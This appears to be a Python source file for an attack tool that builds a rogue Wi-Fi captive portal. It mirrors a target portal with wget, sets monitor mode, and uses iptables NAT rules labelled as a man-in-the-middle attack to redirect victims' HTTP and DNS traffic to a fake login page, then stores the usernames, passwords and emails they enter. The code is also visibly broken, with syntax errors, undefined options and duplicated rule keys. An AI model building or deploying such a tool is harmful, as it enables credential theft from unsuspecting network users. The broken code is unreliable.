#!/usr/bin/python3
import os
import re
import cgi
import sys
import hashlib
import argparse
import ipaddress 
import traceback
import subprocess
import http.server
from pathtools import path
import socketserver as socketserver
from http.server import HTTPServer as Webserver
import core
from core import JSONCommand,CaptiveClient,PybashyDB
from core import error_printer
from backendDB import * 
from backendDB import greenprint
#try:
#    from urllib.parse import urlparse
#except ImportError:
#    from urlparse import urlparse
#try:
#    import SocketServer as socketserver
#except ImportError:
parser = argparse.ArgumentParser(description='Captive Portal tool')
parser.add_argument('--target',
                                 dest    = 'target',
                                 action  = "store" ,
                                 default = "http://127.0.0.1.index.html", 
                                 help    = "Website to mirror, this is usually the only option you should set. Multiple downloads \
                                            will be stored in thier own directories, ready for hosting internally. " )
parser.add_argument('--wget_options',
                                 dest    = 'wget_options',
                                 action  = "store" ,
                                 default = "-nd -H -np -k -p -E" ,
                                 help    = "Wget options, Mirroring to a subdirectory is the default \n DEFAULT : -nd -H -np -k -p -E" )
parser.add_argument('--user-agent',
                                 dest    = 'useragent',
                                 action  = "store" ,
                                 default = 'Mozilla/5.0 (X11; Linux x86_64;x rv:28.0) Gecko/20100101  Firefox/28.0' ,
                                 help    = "User agent to bypass crappy limitations \n DEFAULT : Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0" )
parser.add_argument('--directory_prefix',
                                 dest    = 'directory_prefix',
                                 action  = "store" ,
                                 default = './website_mirrors/' ,
                                 help    = "Storage dirctory to place the downloaded files in, defaults to script working directory" )
parser.add_argument('--monitor_iface',
                                 dest    = 'moniface',
                                 action  = "store" ,
                                 default = 'mon0' ,
                                 help    = "" )
parser.add_argument('--ethernet_iface',
                                 dest    = 'iface',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )
parser.add_argument('--ethernet_iface_name',
                                 dest    = 'iface_name',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--filename',
                                 dest    = 'filename',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--port',
                                 dest    = 'port',
                                 action  = "store" ,
                                 default = '9090' ,
                                 help    = "Port you are serving the HTML/captive portal from" )                                 
parser.add_argument('--portal_page',
                                 dest    = 'index',
                                 action  = "store" ,
                                 default = 'index.html' ,
                                 help    = "index page to serve" )                                 
parser.add_argument('--htmldirectory',
                                 dest    = 'htmldirectory',
                                 action  = "store" ,
                                 default = './html/' ,
                                 help    = "directory the captive portal index is in" )                                 
parser.add_argument('--',
                                 dest    = '',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--',
                                 dest    = '',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--debug',
                                 dest    = 'debug',
                                 action  = "store" ,
                                 default = 'True' ,
                                 help    = 'Verbose Output and Debug Pages are enabled with this "Default : On " option' )                                 


#########################################################
###         INITIALIZE DATABASE TABLES
#########################################################
testuser = CaptiveClient(Hostname= "mainbrain",
                         username= "johnmclaine",
                         password= "machinegun",
                         macaddr = "de:ad:be:ef:ca:fe",
                         email   = "nicecop@nakatomi.com",
                         notes   = "treat with respect",
                        )

try:
    PybashyDB.create_all()
    PybashyDB.session.commit()
except Exception:
    exc_type, exc_value, exc_tb = sys.exc_info()
    tb = traceback.TracebackException(exc_type, exc_value, exc_tb) 
    core.error_message("[-] Database Table Creation FAILED \n" + ''.join(tb.format_exception_only()))

#########################################################
###        Page Mirroring Tool
#########################################################
class GetPage():
    """class to use for mirroring the captive portal you are attacking"""
    def __init__(self, directory_prefix:str, target:str , useragent:str , wget_options:str):
        self.request_headers    = {'User-Agent' : useragent }
        self.storage_directory  = directory_prefix
        self.wget_options        = wget_options
        #core.PybashyRunFunction(self.wgetcmd)
        wgetstep  = {  
                    "MirrorCaptivePortal"  : {
                        'command'        : 'wget {} --directory-prefix={} {}'.format(self.wget_options , self.storage_directory, target),
                        'info_message'   : "[+] Fetching Webpage",
                        'success_message': "[+] Page Downloaded",
                        'failure_message': "[-] Download Failure"
                        }
                    }
        core.PybashyRunSingleJSON(wgetstep)


#########################################################
###         Backend Service
#########################################################

class BackendServer():
    def __init__(self, progargs, inames = ['username','email','password'] ):
        '''
iname are the inputs you are attempting to capture
    pass it the names as strings in a list
        - [str,str,str,str]
        
        '''
        # basic variables for existance
        self.formdata        = cgi.FieldStorage()
        self.index           = progargs.index
        self.PORT            = progargs.port
        self.ipaddress       = progargs.ipaddress
        self.iface           = progargs.iface
        self.moniface        = progargs.moniface

    def RunServer(self):
        # setup the core functions
        # we need to establish the mitm network with the json 
        # contained in EstablishMITMnetwork()
        # execution pool to hold CommandSet()
        self.exec_pool          = core.ExecutionPool()
        self.function_prototype = core.CommandSet()
        #self.new_function       = FunctionSet()
        
        #run tests from the core.py
        core.run_test()
        ###################################################
        #       HERE IS WHERE THE WERVER IS STARTED
        ###################################################
        #set monitor mode on flagged interface
        self.SetMonitorMode()
        greenprint("[+] Creating IPTables Rulesets for Man-In-The-Middle Attack")
        core.PybashyRunFunction(self.EstablishMITMnetwork)
        greenprint("[+] Starting web server")
        self.ServePortal()

    #sets monitor mode
    def SetMonitorMode(self):
        try:
            subprocess.check_output(["iwconfig", self.moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
            greenprint("[+] Monitor Mode Enabled")
        except subprocess.CalledProcessError:
            redprint("[-] Failed to set monitor mode")

    def ServePortal(self):
        httpd = http.server.HTTPServer((self.ipaddress, self.PORT), CaptivePortal)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass

    def ServeRedirect(self):
        httpd = http.server.HTTPServer((self.ipaddress, self.PORT), Redirect)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
    
    #function containing the linux commands necesary for operation
    def EstablishMITMnetwork(self):
        ''' functions as command payloads should not be called until the class is initialized'''
        steps = {
        "InterfaceDown": {
            "command"         : "ip link set {0} down".format(self.iface),
            "info_message"    : "[+] Bringing down Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"
                        },
        "AddInterface": {
            "command"         : "ip addr add {0} dev {1}".format(self.ipaddress, self.iface),
            "info_message"    : "[+] Adding New Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "InterfaceUp": {
            "command"         : "ip link set {0} up".format(self.iface),
            "info_message"    : "[+] Initializing Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        #"status" : greenprint("[+]Clearing IP Tables Rulesets"),
        
        "IPTablesFlush": {
            "command"         : "iptables -w 3 --flush",
            "info_message"    : "[+] Flushing IPTables Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesFlushNAT"   : {
            "command"         : "iptables -w 3 --table nat --flush",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesDeleteChain": {
            "command"         : "iptables -w 3 --delete-chain",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 --table nat --delete-chain",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "EnableIPForwarding": {
            "command"         : "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "info_message"    : "[+] enable ip Forwarding",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        #"status" : greenprint("[+]Setup a NAT environment"),
        
        "IPTablesEstablishNAT": {
            "command"         : "iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(self.iface),
            "info_message"    : "[+] Setup a NAT environment",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #greenprint("[+]allow incomming from the outside on the monitor iface")
        
        "IPTablesAllowIncomming": {
            "command"         : "iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(self.moniface),
            "info_message"    : "[+] [+]allow incomming from the outside on the monitor iface",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]allow UDP DNS resolution inside the NAT  via prerouting"),
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to {}".format(self.ipaddress),
            "info_message"    : "[+] Allow UDP DNS resolution inside the NAT  via prerouting",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Loopback Connections"),
        
        "IPTablesAllowLoopback": {
            "command"         : "iptables -w 3 -A INPUT -i lo -j ACCEPT",
            "info_message"    : "[+]Allow Loopback Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        "IPTablesEnableForward": {
            "command"         : "iptables -w 3 -A OUTPUT -o lo -j ACCEPT",
            "info_message"    : "[+] enable ip Forwarding",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Established and Related Incoming Connections")
        
        "IPTablesAllowEstablishedIncomming": {
            "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
            "info_message"    : "[+] Allow Established and Related Incoming Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Established Outgoing Connections")
        
        "IPTablesAllowEstablishedOutgoing": {
            "command"         : "iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT",
            "info_message"    : "[+] Allow Established Outgoing Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Internal to External")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(self.moniface, self.iface),
            "info_message"    : "[+] Internal to External",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        #greenprint("[+]Drop Invalid Packets")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP",
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport 53 -j ACCEPT",
            "info_message"    :  "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p udp --dport 53 -j ACCEPT",
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #redprint(".. Allow traffic to captive portal")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport {} -d {} -j ACCEPT".format(self.PORT, self.ipaddress),
            "info_message"    : "[+]Allow traffic to captive portal",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #redprint(".. Block all other traffic")
        
        "IPTablesBlockAll": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -j DROP",
            "info_message"    : "[+] Block all other traffic",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        #greenprint("Redirecting HTTP traffic to captive portal")
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -t nat -A PREROUTING -i IFACE -p tcp --dport 80 -j DNAT --to-destination {}:{}".format(self.ipaddress, self.PORT),
            "info_message"    : "[+] Redirecting HTTP traffic to captive portal",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }

class Redirect(http.server.SimpleHTTPRequestHandler):
    '''
This class is used to respond to every request from new, previously 
unknown, client request. Until they are authorized.

If this is being used as a teaching aid, this class is used to simply 
Redirect all requests to the web resource you point it to
    call as thus:
        try:
            redirect = Redirect(arguments.index,arguments.ipaddress,arguments.port)
            if something == True
                redirect.ServeRedirect()
            elif something == whatever:
                pass
            else:
                pass
        except:
            errorhandler()    
'''
    def __init__(self, index, ipaddress, port):
        self.index     = index
        self.ipaddress = ipaddress
        self.port      = port

    def ServeRedirect(self):
        #whenever this is called you get sent to the portal first
        self.wfile.write('Content-Type : text/html')
        self.wfile.write('Location : /' + self.index)
        self.wfile.write("")
        self.wfile.write('<html>\n<head>\n<meta http-equiv="refresh" content="0;url='+ self.ipaddress + self.port + self.index + '" />\n</head>\n<body></body>\n</html>')



class CaptivePortal(http.server.SimpleHTTPRequestHandler):
    '''This is the captive portal'''
    def __init__(self, index, ipaddress, port,):
        self.index           = index
        self.ipaddress       = ipaddress
        self.port            = port
        self.remote_IP       = self.client_address[0]
        # of course we're in the pool already, we own the place!
        self.networkaddrpool = [self.ipaddress]
        self.hostlist = []
        self.credentials = []
    
    def was_there_was_an_error(self, status_code):
        '''
Returns True if no error
        '''
        # server side error
        set1 = [404,504,503,500]
        set2 = [400,405,501]
        set3 = [500]
        if status_code in set1 :
            blueprint("[-] Server side error - No Image Available in REST response")
            yellow_bold_print("Error Code".format(status_code))
            return False # "[-] Server side error - No {}} Available in REST response"
        if status_code in set2:
            redprint("[-] User error in Image Request")
            yellow_bold_print("Error Code".format(status_code))
            return False # "[-] User error in Request"
        if status_code in set3:
            #unknown error
            blueprint("[-] Unknown Server Error")
            yellow_bold_print("Error Code".format(status_code))
            return False # "[-] Unknown Server Error - No {} Available in REST response"
        # no error!
        if status_code == 200:
            return True

    def GrabStats(self):
        """
Debugging Function to display backend information
        """
        if DEBUG == True:
            self.wfile.write("Content-type: text/html\r\n\r\n")
            self.wfile.write("<font size=+1>Environment</font><\br>")
            for param in os.environ.keys():
                self.wfile.write("<b>%20s</b>: %s<\br>" % (param, os.environ[param]))
    
    def redirect(self):
        return """
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
</head>
<body>
    <b>Redirecting to MITM hoasted captive portal page</b>
</body>
</html>
""".format(self.ipaddress, self.port, self.index)
    
    def login(self):
        return """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title></title>
</head>
<body>
<form class="login" action="do_POST" method="post">
<input type="text" name="username" value="username">
    <input type="text" name="password" value="password">
    <input type="submit" name="submit" value="submit">
    </form>
    </body>
    </html>
    """

    def passedauth(self):
        return "You are now authorized. Navigate to any URL"

    def authpassthrough(self):
        steps = {
        "IPTablesAcceptNAT": {
            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -I FORWARD -s {} -j ACCEPT".formnat(self.remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }

    def authenticate(self, username, password): 
        #check user/pass
            #if they are already in the Db, pass them through the firewall
        if core.DoesUsernameExist(username) == True:
            # run auth function
            redprint('Updating IP tables to allow {} through'.format(self.remote_IP))
            core.PybashyRunFunction(self.authpassthrough())
            # add new client to authorized pool of hosts
            greenprint('New authorization from '+ self.remote_IP)
            greenprint('adding to address pool')
            self.networkaddrpool.append(self.remote_IP)
            #set user to active and log them in
            core.
        #if they are not in the DB, force them to authenticate
        elif core.DoesUsernameExist(username) == False :
            self.wfile.write(self.login())
        else:

            #Put a success message up
            self.wfile.write(self.AuthSuccess())

    def AuthSuccess(self):
        #TODO: make a function to display an authorization confirmation page
        # this currently just prints a single line of text to the browser
         self.wfile.write("You are now hacker authorized. Navigate to any URL")

    def savecredentials(self, filename : str, fileorsql = "sql"):
        '''Saves all the information from the client in an sqlite3 DB
        TODO: make it do that lol
        '''
        remote_IP = self.client_address[0]
        #add the new clients credentials to storage
        self.hostlist.append(self.remote_IP)
        self.formdata = cgi.FieldStorage()
        #inames = ['username','email','password'] 
        #for inputname in inames:
        #    setattr(self,inputname, self.formdata.getvalue(inputname))
        if fileorsql == "sql":
            try:
                newuser = CaptiveClient(Hostname= "",
                    username= self.formdata.getvalue("username"),
                    password= self.formdata.getvalue("password"),
                    macaddr = "de:ad:be:ef:ca:fe",
                    email   = self.formdata.getvalue("email"),
                    )
            add_to_db(newuser)
            #with open(filename, 'ab') as filehandle:
               # input1 = self.formdata.getvalue(i1name)
               # input2 = self.formdata.getvalue(i2name)
               # input3 = self.formdata.getvalue(i3name)
                #filehandle.write(self.formdata.getvalue(i1name))
                #filehandle.write('\n')
                #filehandle.write(self.formdata.getvalue(i2name))
                #filehandle.write('\n\n')
                #filehandle.close()
        except Exception:
            error_printer("[-] Could Not Write File!")

        steps = {
        "": {
            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_ip),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -I FORWARD -s {}, -j ACCEPT".format(remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }
        #they passed auth, give them the message and forward them while applying rulesets
        self.wfile.write(self.passedauth())

    def do_GET(self):
        path = self.path
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # print login on request for index
        if path == "/":
            self.wfile.write(self.login())
        else:
            #we are using an external file instead of a local variable
            self.wfile.write(self.redirect())

    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        username = form.getvalue("username")
        password = form.getvalue("password")
        self.authenticate(username,password)


if __name__ == "__main__":
    arguments  = parser.parse_args()

    #filters are necessary to prevent the user from doing strange things and destroying stuff.
    if (arguments.mirror == True) and (arguments.portal == True):
        redprint("[-] INVALID OPTIONS: CANNOT USE -portal FLAG IN CONJUNCTION WITH -mirror FLAG, EXITING PROGRAM!")
        SystemExit

    #debugging stuff
    DEBUG = arguments.debug
    if arguments.debug == True:
        import cgitb
        cgitb.enable()

    # we can either run the program to capture a captive portal...
    if arguments.mirror == True :
        wget_thing = GetPage(arguments.directory_prefix,
                         arguments.target,
                         arguments.useragent,
                         arguments.wget_options)
    # or serve a captured portal!
    elif arguments.portal == True:
        BackendServer(arguments)
